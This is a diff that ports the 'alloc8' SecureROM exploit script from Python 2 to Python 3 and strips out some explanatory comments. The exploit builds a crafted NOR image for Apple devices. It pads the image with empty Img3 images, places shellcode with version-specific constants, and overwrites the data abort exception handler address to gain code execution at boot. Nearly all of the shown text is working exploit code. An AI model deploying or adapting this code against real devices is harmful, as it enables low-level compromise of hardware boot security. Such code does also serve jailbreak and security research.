@@ -58,7 +58,7 @@ alloc8_constants_359_3_2 = [
 
 def empty_img3(size):
 	assert size >= 20
-	return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' * (size - 20)
+	return struct.pack('<4s3I4s', b'Img3'[::-1], size, 0, 0, b'zero'[::-1]) + b'\x00' * (size - 20)
 
 def exploit(nor, version):
 	if version == '359.3':
@@ -68,11 +68,11 @@ def exploit(nor, version):
 	    constants = alloc8_constants_359_3_2
 	    exceptions = [0x5628, 0x5638]
 	else:
-	    print 'ERROR: SecureROM version %s is not supported by alloc8.' % version
+	    print('ERROR: SecureROM version %s is not supported by alloc8.' % version)
 	    sys.exit(1)
 
 	for c in nor.parts[1]:
-		assert c == '\x00'
+		assert c == 0
 	assert len(nor.images) < 32
 
 	MAX_SHELLCODE_LENGTH = 460
@@ -80,7 +80,6 @@ def exploit(nor, version):
 		shellcode = f.read()
 	assert len(shellcode) <= MAX_SHELLCODE_LENGTH
 
-	# Shellcode has placeholder values for constants; check they match and replace with constants from config.
 	placeholders_offset = len(shellcode) - 4 * len(constants)
 	for i in range(len(constants)):
 	    offset = placeholders_offset + 4 * i
@@ -88,12 +87,11 @@ def exploit(nor, version):
 	    assert value == 0xBAD00001 + i
 
 	new_nor = copy.deepcopy(nor)
-	new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
+	new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + b'\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
 
 	while len(new_nor.images) < 713:
 	   new_nor.images.append(empty_img3(new_nor.block_size))
 
-	# Image no. 714 must end at the end of the 4096-byte block.
 	NOR_READ_SIZE = 4096
 	offset = 0
 	for image in new_nor.images:
@@ -101,7 +99,6 @@ def exploit(nor, version):
 	size = NOR_READ_SIZE - offset % NOR_READ_SIZE
 	new_nor.images.append(empty_img3(size))
 
-	# This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort exception handler.
 	SHELLCODE_ADDRESS = 0x84026214 + 1
 	new_nor.images.append(empty_img3(52)[:40] + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions))
 
@@ -115,11 +112,11 @@ def remove_exploit(nor):
     new_images = []
     for image in new_nor.images:
         assert len(image) >= 20
-        if image[16:20] != 'zero'[::-1]:
+        if image[16:20] != b'zero'[::-1]:
             new_images.append(image)
     assert len(new_images) < 32
 
     new_nor.images = new_images
-    new_nor.parts[1] = '\x00' * 460
+    new_nor.parts[1] = b'\x00' * 460
 
     return new_nor
